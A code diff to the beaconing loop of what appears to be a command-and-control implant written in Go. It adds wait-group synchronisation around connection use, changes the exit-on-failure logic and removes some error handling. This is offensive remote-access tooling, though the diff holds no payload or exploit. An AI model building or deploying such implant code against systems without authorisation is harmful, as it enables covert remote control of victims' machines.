@@ -19,9 +19,11 @@ package c2
 */
 
 import (
-	"errors"
-	"fmt"
+	// {{if .Config.Debug}}
 	"log"
+	// {{end}}
+
+	"errors"
 	insecureRand "math/rand"
 	"sync"
 	"time"
@@ -56,42 +58,56 @@ func (t *C2) ServeBeacon() {
 		interval:   t.Profile.Interval,
 		jitter:     t.Profile.Jitter,
 		connection: t.Connection,
+		wg:         &sync.WaitGroup{},
 	}
 	t.mutex.RUnlock()
 
 	for {
-		select {
-		case <-t.closed:
-			t.closed <- struct{}{} // Acklowledge quit
-
-			// {{if .Config.Debug}}
-			log.Printf("[beacon] Exiting beaconing loop")
-			// {{end}}
+		// Only exit when we have reached the maximum number
+		// of connection failures for this precise beaconing
+		// Warn the transports that we are exhausted
+		if t.failures > int(t.Profile.MaxConnectionErrors) {
+			Transports.transportErrors <- ErrMaxAttempts
 			return
-		default:
-			// Only exits when we have reached the maximum number
-			// of connection failures for this precise beaconing
-			if t.failures > int(t.Profile.MaxConnectionErrors) {
-				return
-			}
+		}
 
-			duration := t.Duration()
+		// Get a new duration for this coming beaconing.
+		duration := t.Duration()
 
-			// Run a beaconing process (connect, set up RPC, process tasks)
-			// In the background so that if tasks do not complete, does not
-			// block any next runs and their associated tasks.
-			go t.HandleBeaconTasks(duration)
+		// Run a beaconing process (connect, set up RPC, process tasks)
+		// In the background so that if tasks do not complete, does not
+		// block any next runs and their associated tasks.
+		go t.HandleBeaconTasks(duration)
 
-			// {{if .Config.Debug}}
-			log.Printf("[beacon] sleep until %v", time.Now().Add(duration))
-			// {{end}}
-			time.Sleep(duration)
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] sleep until %v", time.Now().Add(duration))
+		// {{end}}
+
+		// Wait until either:
+		select {
+		case <-t.closed: // The transport has been shutdown by a user
+			t.Beacon.wg.Wait()     // Wait for all beaconing runs to complete
+			t.closed <- struct{}{} // And acklowledge we're closed
+
+		case <-time.After(duration): // The beaconing interval has elapsed
+			t.Beacon.wg.Wait() // Wait for all beaconing runs to complete
+			// TODO: This defeats the whole point of running beacons
+			// in a goroutine, but for now there is a problem with
+			// underlying connection access synchronization.
 		}
 	}
+	// {{if .Config.Debug}}
+	log.Printf("[beacon] Exiting beaconing loop")
+	// {{end}}
 }
 
 // HandleBeaconTasks - Listens for tasks, executes them and sends the results in the background,
 func (t *C2) HandleBeaconTasks(duration time.Duration) {
+
+	// Notify a routine is owning the underlying connection stack, no one
+	// should either restart it or shut any of its components down.
+	t.Beacon.wg.Add(1)
+	defer t.Beacon.wg.Done()
 
 	// Setup the physical connection if needed (will return without errors if not)
 	err := t.startTransport()
@@ -99,7 +115,6 @@ func (t *C2) HandleBeaconTasks(duration time.Duration) {
 		// {{if .Config.Debug}}
 		log.Printf("Error starting connection: %s", err)
 		// {{end}}
-		t.FailedAttempt()
 		return
 	}
 
@@ -109,7 +124,6 @@ func (t *C2) HandleBeaconTasks(duration time.Duration) {
 		// {{if .Config.Debug}}
 		log.Printf("Error setting up connection: %s", err)
 		// {{end}}
-		t.FailedAttempt()
 		return
 	}
 
@@ -121,17 +135,10 @@ func (t *C2) HandleBeaconTasks(duration time.Duration) {
 	log.Printf("[beacon] sending check in ...")
 	// {{end}}
 	nextCheckin := time.Now().Add(duration)
-	err = t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
+	t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
 		ID:          BeaconID,
 		NextCheckin: nextCheckin.UTC().Unix(),
 	}))
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[beacon] send failure %s", err)
-		// {{end}}
-		t.FailedAttempt()
-		return
-	}
 
 	// At this point, we don't increase the number of failed attempts, because the issue
 	// is clearly not a connectivity issue (the whole C2 stack is set up and should be fine)
@@ -168,7 +175,6 @@ func (t *C2) HandleBeaconTasks(duration time.Duration) {
 	log.Printf("[beacon] all tasks completed, sending results to server")
 	// {{end}}
 
-	fmt.Printf("Tasks: %d", len(results))
 	err = t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
 		ID:    BeaconID,
 		Tasks: results,
@@ -258,6 +264,7 @@ type beacon struct {
 	jitter     int64
 	duration   time.Duration
 	connection *transports.Connection
+	wg         *sync.WaitGroup // synchronize access to the underlying connection/session
 }
 
 // Recv - Receive a a task from the server. Blocks until one is received.
